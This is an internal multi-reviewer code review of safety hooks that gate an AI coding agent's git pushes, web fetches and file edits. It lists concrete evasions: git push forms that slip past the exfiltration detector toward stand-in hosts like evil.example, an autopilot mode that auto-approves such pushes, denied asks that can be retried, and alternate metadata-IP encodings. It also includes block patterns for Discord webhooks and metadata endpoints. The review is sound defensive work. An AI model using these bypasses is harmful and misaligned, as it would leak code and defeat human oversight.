# Multi-Lens Code Review — v2.15.0–v2.16.0 guards

**Date:** 2026-07-19
**Scope:** the enforcement hooks added/changed this session — `critical-infra-guard`, `webfetch-egress-guard`, `git-remote-guard`, `lockfile-integrity-guard`, the `lib-smart-approve` mode wiring, `subagent-safety`/`subagent-report-notify` recovery, and `autopilot.sh`.
**Method:** three independent reviewers (security / performance / correctness), findings synthesized; the three highest-impact items were re-verified by running the hooks.

Legend: **[VERIFIED]** = reproduced by executing the hook. **Cross-lens** = flagged by 2+ reviewers.

---

## Summary

| | Count |
|---|---|
| MUST FIX | 3 (S1, C1, P1) |
| SHOULD FIX | 5 |
| Cross-lens | 2 (C1, C2) |

Bottom line: the guards' logic is sound overall — no shell injection, host-parsing handles scp/ssh/userinfo/port forms, `strict → critical-infra → autopilot` ordering keeps *tighten-beats-loosen*. But **`git-remote-guard` has real evasions plus an autopilot bypass**, and the two new edit-channel guards regressed hot-path fork cost. All three MUST-FIX items are in code shipped this session.

---

## 🔴 Cross-Lens Findings (highest confidence)

### C1 — `git-remote-guard` parser is trivially bypassed *(security + correctness)* **[VERIFIED]**
The exfil guard's detector misses common `git push` forms, so a whole-repo push to a foreign host passes unguarded:

| Input | Why it evades | Ref |
|---|---|---|
| `git -C <dir> push https://evil/r.git` | `\bgit\s+push\b` requires `git` and `push` adjacent | `git-remote-guard.sh:88` **[verified: empty output]** |
| `git push -o ci.skip https://evil/r.git` | space-valued option → `args[0]` becomes `ci.skip`, real URL at `args[1]` never checked | `git-remote-guard.sh:91` |
| `git push --repo=https://evil/r.git` | `--`-prefixed token dropped → `target=None` | `git-remote-guard.sh:91` |
| `git remote add x https://evil/r.git && git push x --all` | the guard's *own documented* threat: `remote add` isn't parsed, so `x` is unknown at PreToolUse | `git-remote-guard.sh:11` |

**Fix:** parse the git sub-command more robustly. Strip a leading `git [-C <dir>|--git-dir=…|-c k=v]*` preamble before matching `push`/`remote set-url`. Collect the push target as the first non-flag arg **after** dropping known value-taking options (`-o/--push-option`, `--receive-pack`, `--exec`, `-u/--set-upstream` takes none, `--repo=<url>`), and also honor `--repo=<url>`. Optionally treat `git remote add <name> <foreign-url>` itself as an ask (the add is the intent signal; the push may be a separate call).

### C2 — ack recorded at ask-time treats a denial as consent *(security + correctness)* **[VERIFIED]**
`critical-infra-guard.sh:47`, `git-remote-guard.sh:119`, `lockfile-integrity-guard.sh:62` write the "asked" marker **before** the user answers (a PreToolUse `ask` hook can't see the decision). If the user answers **no**, a second edit/push to the same target that session proceeds silently.

**Fix:** tolerable for the footgun asks (critical-infra/lockfile — worst case is a repeated confirm). **For `git-remote-guard` it's wrong** — an exfil the user rejected can be retried. Either drop the dedup for the exfil gate (re-ask every time) or move the record to a confirmed-yes signal. At minimum, document that a denial does not re-arm the gate.

---

## 🔴 Security

### S1 — MUST FIX: autopilot silently swallows the `git-remote` + `lockfile` asks **[VERIFIED — exfil push auto-approved]**
`lib-smart-approve.sh:57-64` returns `0` for *every* tool call under `/sc-autopilot`, before the Bash allow-list. The critical-infra exclusion at `lib-smart-approve.sh:48-55` (consulting `is_critical_infra_path`) was **not** extended to git-remote or lockfile. So with autopilot active:

```
git push https://evil.example/r.git main
  → git-remote-guard emits permissionDecision:"ask" (PreToolUse)
  → smart-approve auto-approves (PermissionRequest) → push proceeds, NO prompt
```

`safety.sh` / `git-safety.sh` do not police push *destination* (that gap is exactly what git-remote-guard fills), so there is no backstop. **This is a regression introduced this session.**

**Fix:** in `smart_approve_verdict`, before the autopilot loop, `return 1` when the Bash command is a foreign-host push / `set-url` (reuse git-remote-guard's detector — ideally hoist it into a shared lib like `lib-critical-infra.sh`), and when a Write/Edit targets a lockfile basename. Mirrors the existing critical-infra exclusion. Keep the ordering: strict → these exclusions → autopilot.

### S2 — SHOULD: Discord webhook block misses versioned API paths
`webfetch-egress-guard.sh:52` / `mcp-egress-guard.sh:56` match `discord.com/api/webhooks` but not `discord.com/api/v10/webhooks/{id}/{token}` (a fully supported form). **Fix:** allow an optional `/v\d+` segment: `discord(app)?\.com/api/(v\d+/)?webhooks`.

### S3 — CONSIDER: metadata IP match is dotted-quad only
`webfetch-egress-guard.sh:49` / `mcp-egress-guard.sh:52` match the literal `169.254.169.254`; decimal (`2852039166`), hex (`0xa9fea9fe`), and IPv6 (`[fd00:ec2::254]`) encodings evade the IP branch. The path tokens (`/latest/meta-data/`, `computemetadata/v1`, `/metadata/instance`) still catch realistic IMDSv1/GCP/Azure GET paths, so not cleanly exploitable — but add the alternate encodings for robustness. Also: the two egress guards' paste-site lists have drifted (`| ctrl\.v` stray in mcp-egress only) — reconcile into one shared source, same pattern as `lib-secret-patterns.sh`.

---

## 🟡 Performance

### P1 — MUST FIX: the two new edit-channel guards skipped the raw-stdin fast-path
`critical-infra-guard.sh` and `lockfile-integrity-guard.sh` both fire on every `Write/Edit/MultiEdit/NotebookEdit` and fork **~4 jq + 1 tr** across the two before their cheap token/basename check — a regression versus the `safety.sh`/`readonly-guard` standard of bailing on raw `$_INPUT` first. On macOS bash 3.2 that's ~20–35ms added to *every* edit.

**Fix — `lockfile-integrity-guard.sh` after `_INPUT=$(cat)`:**
```sh
case "$_INPUT" in
  *lock*|*shrinkwrap*|*.sum*) ;;
  *) exit 0 ;;
esac
```
**Fix — `critical-infra-guard.sh` after `_INPUT=$(cat)`:** a `case "$_INPUT"` on the distinctive infra tokens (`*workflows*|*Dockerfile*|*docker-compose*|*.tf*|*migration*|*migrate*|*alembic*|*schema.prisma*|*/auth*|*passport*|*.strategy*|…`) → `exit 0` otherwise. The token set must stay a **superset** of `lib-critical-infra.sh`'s matcher (a superset is safe — false-positive tokens just fall through to the precise check).

### P2 — SHOULD: redundant forks in `lib-smart-approve.sh`
- `tool_name` is parsed via jq **twice** per PermissionRequest — `:47` (critical-infra check) and `:66` (main body). Hoist the extraction once; reuse. Removes one jq fork per prompt (doubled since both smart-approve and notify-permission call the verdict).
- `date +%s` at `:33` forks unconditionally, but is only used inside the strict/autopilot loops. Compute lazily on first existing mode file. ~2–3ms saved in the common (no-mode) path.

---

## 🟡 DX / Correctness

### D1 — SHOULD: WebSearch queries are hard-DENIED on topic text **[VERIFIED — exit 2]**
`webfetch-egress-guard.sh:42-57` flattens the WebSearch `query` into the scan blob and applies the BLOCK regexes to it. WebSearch does not fetch a URL, so a legitimate research query is wrongly blocked:
```
{"tool_name":"WebSearch","tool_input":{"query":"how to configure discord.com/api/webhooks in python"}}  → exit 2 (denied)
```
**Fix:** restrict the BLOCK classes to `WebFetch` (or to the `url` field specifically). Leave WebSearch to at most the advisory WARN, or exclude it entirely.

### D2 — CONSIDER
- **Dead code:** `subagent-safety.sh:25-29` — `AGENT_ID` (2 jq + tr + date) and `REPORT_PATH` are unused since the report-pin stopped telling the agent to write a file. Keep `REPORT_DIR`'s `mkdir` only if the fallback scraper needs the dir; drop the rest.
- **Convention drift:** `critical-infra-guard` has no `SUPERCHARGER_*=0` kill-switch, unlike its three same-batch siblings (`SUPERCHARGER_GIT_REMOTE_GUARD` / `_LOCKFILE_GUARD` / `_WEBFETCH_EGRESS`). Add `SUPERCHARGER_CRITICAL_INFRA_GUARD=0`.
- **Test gaps:** no test for `git -C … push` / `--repo=` (would have caught C1); no lockfile PM-hint-fallthrough cases (`deno.lock`/`gradle.lockfile`/`mix.lock`/`pubspec.lock`); no autopilot bare-`0`/negative case. Add regression tests alongside the fixes.
- **Symlink note:** lockfile/critical-infra match on basename/segment, so a `Write` through a symlink whose own name isn't a lockfile/infra path skips the ask. Contrived; advisory asks, not blocks — note only.

---

## Strengths (verified, keep as-is)

- No shell injection: `COMMAND`/`REMOTES`/URLs pass to Python via env/stdin, never interpolated into a shell; `printf`-to-JSON puts attacker data in `%s` args, never the format string.
- `lib-critical-infra.sh` as a single source of truth (consulted by both the guard and `lib-smart-approve`) correctly prevents sibling-parity drift for that class — the pattern S1 should replicate for git-remote/lockfile.
- `git-remote-guard`'s `host_of()` correctly handles scp `git@h:p`, `ssh://`, userinfo@, `:port`.
- Egress **deny** paths hard-block (`exit 2`) and are *not* autopilot-swallowable (unlike the ask-guards) — the deny/ask distinction matters, and S1 is specifically about the ask-guards.
- `autopilot.sh` rejects non-numeric / `0` / negative durations (`10#$N` octal-safe) and clamps loudly to the configurable ceiling.
- All new hooks use fork-free `${BASH_SOURCE[0]%/*}` self-location.

---

## Recommended action

Ship a **2.16.1 patch** fixing the three MUST-FIX + the WebSearch false-deny:
1. **S1** — extend `lib-smart-approve` to decline auto-approval for foreign-host pushes and lockfile edits (shared detector).
2. **C1** — robust `git push` target parsing (`git -C`, value-options, `--repo=`).
3. **P1** — raw-stdin fast-paths in `critical-infra-guard` + `lockfile-integrity-guard`.
4. **D1** — scope `webfetch-egress` BLOCK to WebFetch `url`, not WebSearch queries.

Then C2 (ack-on-deny for the exfil gate), S2 (Discord versioned path), P2 (dedup forks), and the D2 cleanups as a follow-up. Each fix ships with a regression test.
